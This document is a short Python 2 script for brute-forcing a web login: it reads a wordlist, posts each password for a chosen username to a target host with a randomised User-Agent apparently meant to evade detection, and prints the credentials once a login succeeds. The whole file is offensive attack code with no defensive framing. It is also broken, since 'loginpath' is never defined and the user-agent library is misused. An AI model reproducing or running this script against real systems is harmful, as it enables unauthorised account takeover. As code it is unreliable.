#!/usr/bin/python
import sys
import requests
import datetime
import useragent
 

user = raw_input('Enter Your Username : ')
host = raw_input('Enter Your Host or Traget : ')
listfile = raw_input('Enter Your Wordlist : ')
dictionary = open(listfile)
list = dictionary.readlines()
words = [ ]
print "Initializing dictionary",
for entry in list:
    print('.'),
    newword = entry.rstrip("\n")
    words.append(newword)
 
print "Now testing "
 
for password in words:
    ua = useragent().random
    headers = { "User-Agent" : ua }
    post = { "username" : user, "password" : password }
    r = requests.post("http://" + host + loginpath ,  headers=headers, data=post)
    invalid = r.text.find("Invalid")
    if invalid == -1:
        print "\nSuccess! " + user + ":" + password
        print "Completed test at ",
        print datetime.datetime.now()
        sys.exit()
    else:
        print "...."
 
print "Attack unsuccessful...Completed at ",

